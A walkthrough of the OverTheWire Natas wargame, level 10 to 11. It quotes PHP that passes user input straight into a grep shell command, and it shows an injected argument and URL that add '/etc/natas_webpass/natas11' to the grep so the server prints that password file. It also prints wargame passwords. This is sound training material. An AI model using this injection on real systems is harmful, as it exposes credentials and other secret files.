# Natas Level 10 → Level 11

## 🚩 Challenge Info

- **Platform:** OverTheWire – Natas Wargame  
- **Level:** 10 → 11  
- **Category:** Web Security / Command Injection Filter Bypass  
- **URL:** http://natas10.natas.labs.overthewire.org  
- **Username:** `natas10`  
- **Password:** `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

---

## 🎯 Objective

Find the password for **natas11** by bypassing the input filters and exploiting a **command injection vulnerability**.

---

## 🔍 Observations
Upon visiting the page, a search form appears with the message:

> Find words containing:

This interface looks very similar to the previous level, suggesting the application again uses a command-line tool like **grep** to search within a dictionary file.

### 1. Inspecting the Source Code
Viewing the page source (`Ctrl + U`) reveals a link to:

index-source.html


Opening this file exposes the PHP code used by the application.

---

## 🛠️ Investigation

### 1. Reviewing the Application Code

Inside `index-source.html`, the following PHP code appears:
```
$key = $_REQUEST["needle"];

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```
### 2. Understanding the Filter
The application attempts to prevent **command injection** by blocking the characters:

`;  |  &`

However, other **shell operators** are still allowed.

This means we can still manipulate the command using **grep** features.

### 3. Exploiting the Vulnerability
The command executed by the server is:

>grep -i <user_input> dictionary.txt

We can inject another file into the **grep** command:

>. /etc/natas_webpass/natas11

Explanation:

`. matches any character in grep`

We add another file to search: **/etc/natas_webpass/natas11**

Full exploit URL:

>http://natas10.natas.labs.overthewire.org/?needle=. /etc/natas_webpass/natas11

---

## 💡 Discovery
### 1. Executing the Injection
The server runs:

>grep -i . dictionary.txt /etc/natas_webpass/natas11

This command searches both files and prints the contents.

### 2. Retrieving the Password
The output reveals the password for the next level:
```php
natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk